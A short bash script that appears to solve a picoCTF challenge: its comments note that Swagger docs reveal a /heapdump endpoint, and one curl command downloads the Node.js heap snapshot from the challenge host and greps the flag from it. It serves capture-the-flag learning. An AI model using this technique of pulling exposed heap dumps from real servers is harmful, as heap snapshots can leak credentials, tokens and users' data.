#!/bin/bash
# Swagger UI at /api-docs reveals /heapdump endpoint
# grep the flag out of the Node.js heap snapshot
curl -sL "http://verbal-sleep.picoctf.net:50394/heapdump" | grep -oaE "picoCTF\{[^}]+\}"
